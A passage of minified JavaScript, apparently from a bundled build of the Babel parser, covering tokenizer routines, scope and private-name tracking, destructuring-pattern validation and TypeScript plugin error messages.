Q=this.input.slice(this.state.pos,this.state.pos+J);this.state.pos+=J,this.finishToken(X,Q)}readRegexp(){let X=this.state.startLoc,J=this.state.start+1,Q,Y,{pos:W}=this.state;for(;;++W){if(W>=this.length)throw this.raise(S.UnterminatedRegExp,a0(X,1));let $=this.input.charCodeAt(W);if(x8($))throw this.raise(S.UnterminatedRegExp,a0(X,1));if(Q)Q=!1;else{if($===91)Y=!0;else if($===93&&Y)Y=!1;else if($===47&&!Y)break;Q=$===92}}let G=this.input.slice(J,W);++W;let H="",z=()=>a0(X,W+2-J);while(W<this.length){let $=this.codePointAtPos(W),V=String.fromCharCode($);if(HS.has($)){if($===118){if(H.includes("u"))this.raise(S.IncompatibleRegExpUVFlags,z())}else if($===117){if(H.includes("v"))this.raise(S.IncompatibleRegExpUVFlags,z())}if(H.includes(V))this.raise(S.DuplicateRegExpFlags,z())}else if(f8($)||$===92)this.raise(S.MalformedRegExpFlags,z());else break;++W,H+=V}this.state.pos=W,this.finishToken(138,{pattern:G,flags:H})}readInt(X,J,Q=!1,Y=!0){let{n:W,pos:G}=XV(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,J,Q,Y,this.errorHandlers_readInt,!1);return this.state.pos=G,W}readRadixNumber(X){let J=this.state.pos,Q=this.state.curPosition(),Y=!1;this.state.pos+=2;let W=this.readInt(X);if(W==null)this.raise(S.InvalidDigit,a0(Q,2),{radix:X});let G=this.input.charCodeAt(this.state.pos);if(G===110)++this.state.pos,Y=!0;else if(G===109)throw this.raise(S.InvalidDecimal,Q);if(_6(this.codePointAtPos(this.state.pos)))throw this.raise(S.NumberIdentifier,this.state.curPosition());if(Y){let H=this.input.slice(J,this.state.pos).replace(/[_n]/g,"");this.finishToken(136,H);return}this.finishToken(135,W)}readNumber(X){let J=this.state.pos,Q=this.state.curPosition(),Y=!1,W=!1,G=!1,H=!1;if(!X&&this.readInt(10)===null)this.raise(S.InvalidNumber,this.state.curPosition());let z=this.state.pos-J>=2&&this.input.charCodeAt(J)===48;if(z){let q=this.input.slice(J,this.state.pos);if(this.recordStrictModeErrors(S.StrictOctalLiteral,Q),!this.state.strict){let B=q.indexOf("_");if(B>0)this.raise(S.ZeroDigitNumericSeparator,a0(Q,B))}H=z&&!/[89]/.test(q)}let $=this.input.charCodeAt(this.state.pos);if($===46&&!H)++this.state.pos,this.readInt(10),Y=!0,$=this.input.charCodeAt(this.state.pos);if(($===69||$===101)&&!H){if($=this.input.charCodeAt(++this.state.pos),$===43||$===45)++this.state.pos;if(this.readInt(10)===null)this.raise(S.InvalidOrMissingExponent,Q);Y=!0,G=!0,$=this.input.charCodeAt(this.state.pos)}if($===110){if(Y||z)this.raise(S.InvalidBigIntLiteral,Q);++this.state.pos,W=!0}if($===109){if(this.expectPlugin("decimal",this.state.curPosition()),G||z)this.raise(S.InvalidDecimal,Q);++this.state.pos;var V=!0}if(_6(this.codePointAtPos(this.state.pos)))throw this.raise(S.NumberIdentifier,this.state.curPosition());let K=this.input.slice(J,this.state.pos).replace(/[_mn]/g,"");if(W){this.finishToken(136,K);return}if(V){this.finishToken(137,K);return}let Z=H?parseInt(K,8):parseFloat(K);this.finishToken(135,Z)}readCodePoint(X){let{code:J,pos:Q}=JV(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,this.errorHandlers_readCodePoint);return this.state.pos=Q,J}readString(X){let{str:J,pos:Q,curLine:Y,lineStart:W}=k$(X===34?"double":"single",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_string);this.state.pos=Q+1,this.state.lineStart=W,this.state.curLine=Y,this.finishToken(134,J)}readTemplateContinuation(){if(!this.match(8))this.unexpected(null,8);this.state.pos--,this.readTemplateToken()}readTemplateToken(){let X=this.input[this.state.pos],{str:J,firstInvalidLoc:Q,pos:Y,curLine:W,lineStart:G}=k$("template",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_template);if(this.state.pos=Y+1,this.state.lineStart=G,this.state.curLine=W,Q)this.state.firstInvalidTemplateEscapePos=new E6(Q.curLine,Q.pos-Q.lineStart,this.sourceToOffsetPos(Q.pos));if(this.input.codePointAt(Y)===96)this.finishToken(24,Q?null:X+J+"`");else this.state.pos++,this.finishToken(25,Q?null:X+J+"${")}recordStrictModeErrors(X,J){let Q=J.index;if(this.state.strict&&!this.state.strictErrors.has(Q))this.raise(X,J);else this.state.strictErrors.set(Q,[X,J])}readWord1(X){this.state.containsEsc=!1;let J="",Q=this.state.pos,Y=this.state.pos;if(X!==void 0)this.state.pos+=X<=65535?1:2;while(this.state.pos<this.length){let W=this.codePointAtPos(this.state.pos);if(f8(W))this.state.pos+=W<=65535?1:2;else if(W===92){this.state.containsEsc=!0,J+=this.input.slice(Y,this.state.pos);let G=this.state.curPosition(),H=this.state.pos===Q?_6:f8;if(this.input.charCodeAt(++this.state.pos)!==117){this.raise(S.MissingUnicodeEscape,this.state.curPosition()),Y=this.state.pos-1;continue}++this.state.pos;let z=this.readCodePoint(!0);if(z!==null){if(!H(z))this.raise(S.EscapedCharNotAnIdentifier,G);J+=String.fromCodePoint(z)}Y=this.state.pos}else break}return J+this.input.slice(Y,this.state.pos)}readWord(X){let J=this.readWord1(X),Q=_2.get(J);if(Q!==void 0)this.finishToken(Q,WX(Q));else this.finishToken(132,J)}checkKeywordEscapes(){let{type:X}=this.state;if(x2(X)&&this.state.containsEsc)this.raise(S.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:WX(X)})}raise(X,J,Q={}){let Y=J instanceof E6?J:J.loc.start,W=X(Y,Q);if(!(this.optionFlags&2048))throw W;if(!this.isLookahead)this.state.errors.push(W);return W}raiseOverwrite(X,J,Q={}){let Y=J instanceof E6?J:J.loc.start,W=Y.index,G=this.state.errors;for(let H=G.length-1;H>=0;H--){let z=G[H];if(z.loc.index===W)return G[H]=X(Y,Q);if(z.loc.index<W)break}return this.raise(X,J,Q)}updateContext(X){}unexpected(X,J){throw this.raise(S.UnexpectedToken,X!=null?X:this.state.startLoc,{expected:J?WX(J):null})}expectPlugin(X,J){if(this.hasPlugin(X))return!0;throw this.raise(S.MissingPlugin,J!=null?J:this.state.startLoc,{missingPlugin:[X]})}expectOnePlugin(X){if(!X.some((J)=>this.hasPlugin(J)))throw this.raise(S.MissingOneOfPlugins,this.state.startLoc,{missingPlugin:X})}errorBuilder(X){return(J,Q,Y)=>{this.raise(X,mJ(J,Q,Y))}}}class YV{constructor(){this.privateNames=new Set,this.loneAccessors=new Map,this.undefinedPrivateNames=new Map}}class WV{constructor(X){this.parser=void 0,this.stack=[],this.undefinedPrivateNames=new Map,this.parser=X}current(){return this.stack[this.stack.length-1]}enter(){this.stack.push(new YV)}exit(){let X=this.stack.pop(),J=this.current();for(let[Q,Y]of Array.from(X.undefinedPrivateNames))if(J){if(!J.undefinedPrivateNames.has(Q))J.undefinedPrivateNames.set(Q,Y)}else this.parser.raise(S.InvalidPrivateFieldResolution,Y,{identifierName:Q})}declarePrivateName(X,J,Q){let{privateNames:Y,loneAccessors:W,undefinedPrivateNames:G}=this.current(),H=Y.has(X);if(J&3){let z=H&&W.get(X);if(z){let $=z&4,V=J&4,K=z&3,Z=J&3;if(H=K===Z||$!==V,!H)W.delete(X)}else if(!H)W.set(X,J)}if(H)this.parser.raise(S.PrivateNameRedeclaration,Q,{identifierName:X});Y.add(X),G.delete(X)}usePrivateName(X,J){let Q;for(Q of this.stack)if(Q.privateNames.has(X))return;if(Q)Q.undefinedPrivateNames.set(X,J);else this.parser.raise(S.InvalidPrivateFieldResolution,J,{identifierName:X})}}class aJ{constructor(X=0){this.type=X}canBeArrowParameterDeclaration(){return this.type===2||this.type===1}isCertainlyParameterDeclaration(){return this.type===3}}class m2 extends aJ{constructor(X){super(X);this.declarationErrors=new Map}recordDeclarationError(X,J){let Q=J.index;this.declarationErrors.set(Q,[X,J])}clearDeclarationError(X){this.declarationErrors.delete(X)}iterateErrors(X){this.declarationErrors.forEach(X)}}class GV{constructor(X){this.parser=void 0,this.stack=[new aJ],this.parser=X}enter(X){this.stack.push(X)}exit(){this.stack.pop()}recordParameterInitializerError(X,J){let Q=J.loc.start,{stack:Y}=this,W=Y.length-1,G=Y[W];while(!G.isCertainlyParameterDeclaration()){if(G.canBeArrowParameterDeclaration())G.recordDeclarationError(X,Q);else return;G=Y[--W]}this.parser.raise(X,Q)}recordArrowParameterBindingError(X,J){let{stack:Q}=this,Y=Q[Q.length-1],W=J.loc.start;if(Y.isCertainlyParameterDeclaration())this.parser.raise(X,W);else if(Y.canBeArrowParameterDeclaration())Y.recordDeclarationError(X,W);else return}recordAsyncArrowParametersError(X){let{stack:J}=this,Q=J.length-1,Y=J[Q];while(Y.canBeArrowParameterDeclaration()){if(Y.type===2)Y.recordDeclarationError(S.AwaitBindingIdentifier,X);Y=J[--Q]}}validateAsPattern(){let{stack:X}=this,J=X[X.length-1];if(!J.canBeArrowParameterDeclaration())return;J.iterateErrors(([Q,Y])=>{this.parser.raise(Q,Y);let W=X.length-2,G=X[W];while(G.canBeArrowParameterDeclaration())G.clearDeclarationError(Y.index),G=X[--W]})}}function zS(){return new aJ(3)}function $S(){return new m2(1)}function VS(){return new m2(2)}function HV(){return new aJ}class zV extends QV{addExtra(X,J,Q,Y=!0){if(!X)return;let{extra:W}=X;if(W==null)W={},X.extra=W;if(Y)W[J]=Q;else Object.defineProperty(W,J,{enumerable:Y,value:Q})}isContextual(X){return this.state.type===X&&!this.state.containsEsc}isUnparsedContextual(X,J){if(this.input.startsWith(J,X)){let Q=this.input.charCodeAt(X+J.length);return!(f8(Q)||(Q&64512)===55296)}return!1}isLookaheadContextual(X){let J=this.nextTokenStart();return this.isUnparsedContextual(J,X)}eatContextual(X){if(this.isContextual(X))return this.next(),!0;return!1}expectContextual(X,J){if(!this.eatContextual(X)){if(J!=null)throw this.raise(J,this.state.startLoc);this.unexpected(null,X)}}canInsertSemicolon(){return this.match(140)||this.match(8)||this.hasPrecedingLineBreak()}hasPrecedingLineBreak(){return _$(this.input,this.offsetToSourcePos(this.state.lastTokEndLoc.index),this.state.start)}hasFollowingLineBreak(){return _$(this.input,this.state.end,this.nextTokenStart())}isLineTerminator(){return this.eat(13)||this.canInsertSemicolon()}semicolon(X=!0){if(X?this.isLineTerminator():this.eat(13))return;this.raise(S.MissingSemicolon,this.state.lastTokEndLoc)}expect(X,J){if(!this.eat(X))this.unexpected(J,X)}tryParse(X,J=this.state.clone()){let Q={node:null};try{let Y=X((W=null)=>{throw Q.node=W,Q});if(this.state.errors.length>J.errors.length){let W=this.state;return this.state=J,this.state.tokensLength=W.tokensLength,{node:Y,error:W.errors[J.errors.length],thrown:!1,aborted:!1,failState:W}}return{node:Y,error:null,thrown:!1,aborted:!1,failState:null}}catch(Y){let W=this.state;if(this.state=J,Y instanceof SyntaxError)return{node:null,error:Y,thrown:!0,aborted:!1,failState:W};if(Y===Q)return{node:Q.node,error:null,thrown:!1,aborted:!0,failState:W};throw Y}}checkExpressionErrors(X,J){if(!X)return!1;let{shorthandAssignLoc:Q,doubleProtoLoc:Y,privateKeyLoc:W,optionalParametersLoc:G,voidPatternLoc:H}=X,z=!!Q||!!Y||!!G||!!W||!!H;if(!J)return z;if(Q!=null)this.raise(S.InvalidCoverInitializedName,Q);if(Y!=null)this.raise(S.DuplicateProto,Y);if(W!=null)this.raise(S.UnexpectedPrivateField,W);if(G!=null)this.unexpected(G);if(H!=null)this.raise(S.InvalidCoverDiscardElement,H)}isLiteralPropertyName(){return g$(this.state.type)}isPrivateName(X){return X.type==="PrivateName"}getPrivateNameSV(X){return X.id.name}hasPropertyAsPrivateName(X){return(X.type==="MemberExpression"||X.type==="OptionalMemberExpression")&&this.isPrivateName(X.property)}isObjectProperty(X){return X.type==="ObjectProperty"}isObjectMethod(X){return X.type==="ObjectMethod"}initializeScopes(X=this.options.sourceType==="module"){let J=this.state.labels;this.state.labels=[];let Q=this.exportedIdentifiers;this.exportedIdentifiers=new Set;let Y=this.inModule;this.inModule=X;let W=this.scope,G=this.getScopeHandler();this.scope=new G(this,X);let H=this.prodParam;this.prodParam=new s$;let z=this.classScope;this.classScope=new WV(this);let $=this.expressionScope;return this.expressionScope=new GV(this),()=>{this.state.labels=J,this.exportedIdentifiers=Q,this.inModule=Y,this.scope=W,this.prodParam=H,this.classScope=z,this.expressionScope=$}}enterInitialScopes(){let X=0;if(this.inModule||this.optionFlags&1)X|=2;if(this.optionFlags&32)X|=1;let J=!this.inModule&&this.options.sourceType==="commonjs";if(J||this.optionFlags&2)X|=4;this.prodParam.enter(X);let Q=J?514:1;if(this.optionFlags&4)Q|=512;this.scope.enter(Q)}checkDestructuringPrivate(X){let{privateKeyLoc:J}=X;if(J!==null)this.expectPlugin("destructuringPrivate",J)}}class pJ{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null,this.voidPatternLoc=null}}class rJ{constructor(X,J,Q){if(this.type="",this.start=J,this.end=0,this.loc=new dJ(Q),(X==null?void 0:X.optionFlags)&128)this.range=[J,0];if(X!=null&&X.filename)this.loc.filename=X.filename}}var S2=rJ.prototype;S2.__clone=function(){let X=new rJ(void 0,this.start,this.loc.start),J=Object.keys(this);for(let Q=0,Y=J.length;Q<Y;Q++){let W=J[Q];if(W!=="leadingComments"&&W!=="trailingComments"&&W!=="innerComments")X[W]=this[W]}return X};class $V extends zV{startNode(){let X=this.state.startLoc;return new rJ(this,X.index,X)}startNodeAt(X){return new rJ(this,X.index,X)}startNodeAtNode(X){return this.startNodeAt(X.loc.start)}finishNode(X,J){return this.finishNodeAt(X,J,this.state.lastTokEndLoc)}finishNodeAt(X,J,Q){if(X.type=J,X.end=Q.index,X.loc.end=Q,this.optionFlags&128)X.range[1]=Q.index;if(this.optionFlags&4096)this.processComment(X);return X}resetStartLocation(X,J){if(X.start=J.index,X.loc.start=J,this.optionFlags&128)X.range[0]=J.index}resetEndLocation(X,J=this.state.lastTokEndLoc){if(X.end=J.index,X.loc.end=J,this.optionFlags&128)X.range[1]=J.index}resetStartLocationFromNode(X,J){this.resetStartLocation(X,J.loc.start)}castNodeTo(X,J){return X.type=J,X}cloneIdentifier(X){let{type:J,start:Q,end:Y,loc:W,range:G,name:H}=X,z=Object.create(S2);if(z.type=J,z.start=Q,z.end=Y,z.loc=W,z.range=G,z.name=H,X.extra)z.extra=X.extra;return z}cloneStringLiteral(X){let{type:J,start:Q,end:Y,loc:W,range:G,extra:H}=X,z=Object.create(S2);return z.type=J,z.start=Q,z.end=Y,z.loc=W,z.range=G,z.extra=H,z.value=X.value,z}}var VV=(X)=>{return X.type==="ParenthesizedExpression"?VV(X.expression):X};class KV extends $V{toAssignable(X,J=!1){var Q,Y;let W=void 0;if(X.type==="ParenthesizedExpression"||(Q=X.extra)!=null&&Q.parenthesized)if(W=VV(X),J){if(W.type==="Identifier")this.expressionScope.recordArrowParameterBindingError(S.InvalidParenthesizedAssignment,X);else if(W.type!=="MemberExpression"&&!this.isOptionalMemberExpression(W))this.raise(S.InvalidParenthesizedAssignment,X)}else this.raise(S.InvalidParenthesizedAssignment,X);switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":break;case"ObjectExpression":this.castNodeTo(X,"ObjectPattern");for(let H=0,z=X.properties.length,$=z-1;H<z;H++){var G;let V=X.properties[H],K=H===$;if(this.toAssignableObjectExpressionProp(V,K,J),K&&V.type==="RestElement"&&(G=X.extra)!=null&&G.trailingCommaLoc)this.raise(S.RestTrailingComma,X.extra.trailingCommaLoc)}break;case"ObjectProperty":{let{key:H,value:z}=X;if(this.isPrivateName(H))this.classScope.usePrivateName(this.getPrivateNameSV(H),H.loc.start);this.toAssignable(z,J);break}case"SpreadElement":throw Error("Internal @babel/parser error (this is a bug, please report it). SpreadElement should be converted by .toAssignable's caller.");case"ArrayExpression":this.castNodeTo(X,"ArrayPattern"),this.toAssignableList(X.elements,(Y=X.extra)==null?void 0:Y.trailingCommaLoc,J);break;case"AssignmentExpression":if(X.operator!=="=")this.raise(S.MissingEqInAssignment,X.left.loc.end);if(this.castNodeTo(X,"AssignmentPattern"),delete X.operator,X.left.type==="VoidPattern")this.raise(S.VoidPatternInitializer,X.left);this.toAssignable(X.left,J);break;case"ParenthesizedExpression":this.toAssignable(W,J);break}}toAssignableObjectExpressionProp(X,J,Q){if(X.type==="ObjectMethod")this.raise(X.kind==="get"||X.kind==="set"?S.PatternHasAccessor:S.PatternHasMethod,X.key);else if(X.type==="SpreadElement"){this.castNodeTo(X,"RestElement");let Y=X.argument;if(this.checkToRestConversion(Y,!1),this.toAssignable(Y,Q),!J)this.raise(S.RestTrailingComma,X)}else this.toAssignable(X,Q)}toAssignableList(X,J,Q){let Y=X.length-1;for(let W=0;W<=Y;W++){let G=X[W];if(!G)continue;if(this.toAssignableListItem(X,W,Q),G.type==="RestElement"){if(W<Y)this.raise(S.RestTrailingComma,G);else if(J)this.raise(S.RestTrailingComma,J)}}}toAssignableListItem(X,J,Q){let Y=X[J];if(Y.type==="SpreadElement"){this.castNodeTo(Y,"RestElement");let W=Y.argument;this.checkToRestConversion(W,!0),this.toAssignable(W,Q)}else this.toAssignable(Y,Q)}isAssignable(X,J){switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":return!0;case"ObjectExpression":{let Q=X.properties.length-1;return X.properties.every((Y,W)=>{return Y.type!=="ObjectMethod"&&(W===Q||Y.type!=="SpreadElement")&&this.isAssignable(Y)})}case"ObjectProperty":return this.isAssignable(X.value);case"SpreadElement":return this.isAssignable(X.argument);case"ArrayExpression":return X.elements.every((Q)=>Q===null||this.isAssignable(Q));case"AssignmentExpression":return X.operator==="=";case"ParenthesizedExpression":return this.isAssignable(X.expression);case"MemberExpression":case"OptionalMemberExpression":return!J;default:return!1}}toReferencedList(X,J){return X}toReferencedListDeep(X,J){this.toReferencedList(X,J);for(let Q of X)if((Q==null?void 0:Q.type)==="ArrayExpression")this.toReferencedListDeep(Q.elements)}parseSpread(X){let J=this.startNode();return this.next(),J.argument=this.parseMaybeAssignAllowIn(X,void 0),this.finishNode(J,"SpreadElement")}parseRestBinding(){let X=this.startNode();this.next();let J=this.parseBindingAtom();if(J.type==="VoidPattern")this.raise(S.UnexpectedVoidPattern,J);return X.argument=J,this.finishNode(X,"RestElement")}parseBindingAtom(){switch(this.state.type){case 0:{let X=this.startNode();return this.next(),X.elements=this.parseBindingList(3,93,1),this.finishNode(X,"ArrayPattern")}case 5:return this.parseObjectLike(8,!0);case 88:return this.parseVoidPattern(null)}return this.parseIdentifier()}parseBindingList(X,J,Q){let Y=Q&1,W=[],G=!0;while(!this.eat(X)){if(G)G=!1;else this.expect(12);if(Y&&this.match(12))W.push(null);else if(this.eat(X))break;else if(this.match(21)){let H=this.parseRestBinding();if(this.hasPlugin("flow")||Q&2)H=this.parseFunctionParamType(H);if(W.push(H),!this.checkCommaAfterRest(J)){this.expect(X);break}}else{let H=[];if(Q&2){if(this.match(26)&&this.hasPlugin("decorators"))this.raise(S.UnsupportedParameterDecorator,this.state.startLoc);while(this.match(26))H.push(this.parseDecorator())}W.push(this.parseBindingElement(Q,H))}}return W}parseBindingRestProperty(X){if(this.next(),this.hasPlugin("discardBinding")&&this.match(88))X.argument=this.parseVoidPattern(null),this.raise(S.UnexpectedVoidPattern,X.argument);else X.argument=this.parseIdentifier();return this.checkCommaAfterRest(125),this.finishNode(X,"RestElement")}parseBindingProperty(){let{type:X,startLoc:J}=this.state;if(X===21)return this.parseBindingRestProperty(this.startNode());let Q=this.startNode();if(X===139)this.expectPlugin("destructuringPrivate",J),this.classScope.usePrivateName(this.state.value,J),Q.key=this.parsePrivateName();else this.parsePropertyName(Q);return Q.method=!1,this.parseObjPropValue(Q,J,!1,!1,!0,!1)}parseBindingElement(X,J){let Q=this.parseMaybeDefault();if(this.hasPlugin("flow")||X&2)this.parseFunctionParamType(Q);if(J.length)Q.decorators=J,this.resetStartLocationFromNode(Q,J[0]);return this.parseMaybeDefault(Q.loc.start,Q)}parseFunctionParamType(X){return X}parseMaybeDefault(X,J){if(X!=null||(X=this.state.startLoc),J=J!=null?J:this.parseBindingAtom(),!this.eat(29))return J;let Q=this.startNodeAt(X);if(J.type==="VoidPattern")this.raise(S.VoidPatternInitializer,J);return Q.left=J,Q.right=this.parseMaybeAssignAllowIn(),this.finishNode(Q,"AssignmentPattern")}isValidLVal(X,J,Q){switch(X){case"AssignmentPattern":return"left";case"RestElement":return"argument";case"ObjectProperty":return"value";case"ParenthesizedExpression":return"expression";case"ArrayPattern":return"elements";case"ObjectPattern":return"properties";case"VoidPattern":return!0}return!1}isOptionalMemberExpression(X){return X.type==="OptionalMemberExpression"}checkLVal(X,J,Q=64,Y=!1,W=!1,G=!1){var H;let z=X.type;if(this.isObjectMethod(X))return;let $=this.isOptionalMemberExpression(X);if($||z==="MemberExpression"){if($){if(this.expectPlugin("optionalChainingAssign",X.loc.start),J.type!=="AssignmentExpression")this.raise(S.InvalidLhsOptionalChaining,X,{ancestor:J})}if(Q!==64)this.raise(S.InvalidPropertyBindingPattern,X);return}if(z==="Identifier"){this.checkIdentifier(X,Q,W);let{name:M}=X;if(Y)if(Y.has(M))this.raise(S.ParamDupe,X);else Y.add(M);return}else if(z==="VoidPattern"&&J.type==="CatchClause")this.raise(S.VoidPatternCatchClauseParam,X);let V=this.isValidLVal(z,!(G||(H=X.extra)!=null&&H.parenthesized)&&J.type==="AssignmentExpression",Q);if(V===!0)return;if(V===!1){let M=Q===64?S.InvalidLhs:S.InvalidLhsBinding;this.raise(M,X,{ancestor:J});return}let K,Z;if(typeof V==="string")K=V,Z=z==="ParenthesizedExpression";else[K,Z]=V;let q=z==="ArrayPattern"||z==="ObjectPattern"?{type:z}:J,B=X[K];if(Array.isArray(B)){for(let M of B)if(M)this.checkLVal(M,q,Q,Y,W,Z)}else if(B)this.checkLVal(B,q,Q,Y,W,Z)}checkIdentifier(X,J,Q=!1){if(this.state.strict&&(Q?d$(X.name,this.inModule):p$(X.name)))if(J===64)this.raise(S.StrictEvalArguments,X,{referenceName:X.name});else this.raise(S.StrictEvalArgumentsBinding,X,{bindingName:X.name});if(J&8192&&X.name==="let")this.raise(S.LetInLexicalBinding,X);if(!(J&64))this.declareNameFromIdentifier(X,J)}declareNameFromIdentifier(X,J){this.scope.declareName(X.name,J,X.loc.start)}checkToRestConversion(X,J){switch(X.type){case"ParenthesizedExpression":this.checkToRestConversion(X.expression,J);break;case"Identifier":case"MemberExpression":break;case"ArrayExpression":case"ObjectExpression":if(J)break;default:this.raise(S.InvalidRestAssignmentPattern,X)}}checkCommaAfterRest(X){if(!this.match(12))return!1;return this.raise(this.lookaheadCharCode()===X?S.RestTrailingComma:S.ElementAfterRest,this.state.startLoc),!0}}function KS(X){if(X==null)throw Error(`Unexpected ${X} value.`);return X}function b$(X){if(!X)throw Error("Assert fail")}var K1=G6`typescript`({AbstractMethodHasImplementation:({methodName:X})=>`Method '${X}' cannot have an implementation because it is marked abstract.`,AbstractPropertyHasInitializer:({propertyName:X})=>`Property '${X}' cannot have an initializer because it is marked abstract.`,AccessorCannotBeOptional:"An 'accessor' property cannot be declared optional.",AccessorCannotDeclareThisParameter:"'get' and 'set' accessors cannot declare 'this' parameters.",AccessorCannotHaveTypeParameters:"An accessor cannot have type parameters.",ClassMethodHasDeclare:"Class methods cannot have the 'declare' modifier.",ClassMethodHasReadonly:"Class methods cannot have the 'readonly' modifier.",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"A 'const' initializer in an ambient context must be a string or numeric literal or literal enum reference.",ConstructorHasTypeParameters:"Type parameters cannot appear on a constructor declaration.",DeclareAccessor:({kind:X})=>`'declare' is not allowed in ${X}ters.`,DeclareClassFieldHasInitializer:"Initializers are not allowed in ambient contexts.",DeclareFunctionHasImplementation:"An implementation cannot be declared in ambient contexts.",DuplicateAccessibilityModifier:({modifier:X})=>`Accessibility modifier already seen: '${X}'.`,DuplicateModifier:({modifier:X})=>`Duplicate modifier: '${X}'.`,EmptyHeritageClauseType:({token:X})=>`'${X}' list cannot be empty.`,EmptyTypeArguments:"Type argument list cannot be empty.",EmptyTypeParameters:"Type parameter list cannot be empty.",ExpectedAmbientAfterExportDeclare:"'export declare' must be followed by an ambient declaration.",ImportAliasHasImportType:"An import alias can not use 'import type'.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` modifier",IncompatibleModifiers:({modifiers:X})=>`'${X[0]}' modifier cannot be used with '${X[1]}' modifier.`,IndexSignatureHasAbstract:"Index signatures cannot have the 'abstract' modifier.",IndexSignatureHasAccessibility:({modifier:X})=>`Index signatures cannot have an accessibility modifier ('${X}').`,IndexSignatureHasDeclare:"Index signatures cannot have the 'declare' modifier.",IndexSignatureHasOverride:"'override' modifier cannot appear on an index signature.",IndexSignatureHasStatic:"Index signatures cannot have the 'static' modifier.",InitializerNotAllowedInAmbientContext:"Initializers are not allowed in ambient contexts.",InvalidHeritageClauseType:({token:X})=>`'${X}' list can only include identifiers or qualified-names with optional type arguments.`,InvalidModifierOnAwaitUsingDeclaration:(X)=>`'${X}' modifier cannot appear on an await using declaration.`,InvalidModifierOnTypeMember:({modifier:X})=>`'${X}' modifier cannot appear on a type member.`,InvalidModifierOnTypeParameter:({modifier:X})=>`'${X}' modifier cannot appear on a type parameter.`,InvalidModifierOnTypeParameterPositions:({modifier:X})=>`'${X}' modifier can only appear on a type parameter of a class, interface or type alias.`,InvalidModifierOnUsingDeclaration:(X)=>`'${X}' modifier cannot appear on a using declaration.`,InvalidModifiersOrder:({orderedModifiers:X})=>`'${X[0]}' modifier must precede '${X[1]}' modifier.`,InvalidPropertyAccessAfterInstantiationExpression:"Invalid property access after an instantiation expression. You can either wrap the instantiation expression in parentheses, or delete the type arguments.",InvalidTupleMemberLabel:"Tuple members must be labeled with a simple identifier.",MissingInterfaceName:"'interface' declarations must be followed by an identifier.",NonAbstractClassHasAbstractMethod:"Abstract methods can only appear within an abstract class.",NonClassMethodPropertyHasAbstractModifier:"'abstract' modifier can only appear on a class, method, or property declaration.",OptionalTypeBeforeRequired:"A required element cannot follow an optional element.",OverrideNotInSubClass:"This member cannot have an 'override' modifier because its containing class does not extend another class.",PatternIsOptional:"A binding pattern parameter cannot be optional in an implementation signature.",PrivateElementHasAbstract:"Private elements cannot have the 'abstract' modifier.",PrivateElementHasAccessibility:({modifier:X})=>`Private elements cannot have an accessibility modifier ('${X}').`,ReadonlyForMethodSignature:"'readonly' modifier can only appear on a property declaration or index signature.",ReservedArrowTypeParam:"This syntax is reserved in files with the .mts or .cts extension. Add a trailing comma, as in `<T,>() => ...`.",ReservedTypeAssertion:"This syntax is reserved in files with the .mts or .cts extension. Use an `as` expression instead.",SetAccessorCannotHaveOptionalParameter:"A 'set' accessor cannot have an optional parameter.",SetAccessorCannotHaveRestParameter:"A 'set' accessor cannot have rest parameter.",SetAccessorCannotHaveReturnType:"A 'set' accessor cannot have a return type annotation.",SingleTypeParameterWithoutTrailingComma:({typeParameterName:X})=>`Single type parameter ${X} should have a trailing comma. Example usage: <${X},>.`,StaticBlockCannotHaveModifier:"Static class blocks cannot have any modifier.",TupleOptionalAfterType:"A labeled tuple optional element must be declared using a question mark after the name and before the colon (`name?: type`), rather than after the type (`name: type?`).",TypeAnnotationAfterAssign:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeImportCannotSpecifyDefaultAndNamed:"A type-only import can specify a default import or named bindings, but not both.",TypeModifierIsUsedInTypeExports:"The 'type' modifier cannot be used on a named export when 'export type' is used on its export statement.",TypeModifierIsUsedInTypeImports:"The 'type' modifier cannot be used on a named import when 'import type' is used on its import statement.",UnexpectedParameterModifier:"A parameter property is only allowed in a constructor implementation.",UnexpectedReadonly:"'readonly' type modifier is only permitted on array and tuple literal types.",UnexpectedTypeAnnotation:"Did not expect a type annotation here.",UnexpectedTypeCastInParameter:"Unexpected type cast in parameter position.",UnsupportedImportTypeArgument:"Argument in a type import must be a string literal.",UnsupportedParameterPropertyKind:"A parameter property may not be declared using a binding pattern.",UnsupportedSignatureParameterKind:({type:X})=>`Name in a signature must be an Identifier, ObjectPattern or ArrayPattern, instead got ${X}.`,UsingDeclarationInAmbientContext:(X)=>`'${X}' declarations are not allowed in ambient contexts.`});function US(X){switch(X){case"any":return"TSAnyKeyword";case"boolean":return"TSBooleanKeyword";case"bigint":return"TSBigIntKeyword";case"never":return"TSNeverKeyword";case"number":return"TSNumberKeyword";case"object":return"TSObjectKeyword";case"string":return"TSStringKeyword";case"symbol":return"TSSymbolKeyword";case"undefined":return"TSUndefinedKeyword";case"unknown":return"TSUnknownKeyword";default:return}}function v$(X){return X==="private"||X==="public"||X==="protected"}function ZS(X){return X==="in"||X==="out"}var qS=(X)=>class extends X{constructor(...Q){super(...Q);this.tsParseInOutModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out"],disallowedModifiers:["const","public","private","protected","readonly","declare","abstract","override"],errorTemplate:K1.InvalidModifierOnTypeParameter}),this.tsParseConstModifier=this.tsParseModifiers.bind(this,{allowedModifiers:["const"],disallowedModifiers:["in","out"],errorTemplate:K1.InvalidModifierOnTypeParameterPositions}),this.tsParseInOutConstModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out","const"],disallowedModifiers:["public","private","protected","readonly","declare","abstract","override"],errorTemplate:K1.InvalidModifierOnTypeParameter})}getScopeHandler(){return n$}tsIsIdentifier(){return W0(this.state.type)}tsTokenCanFollowModifier(){return 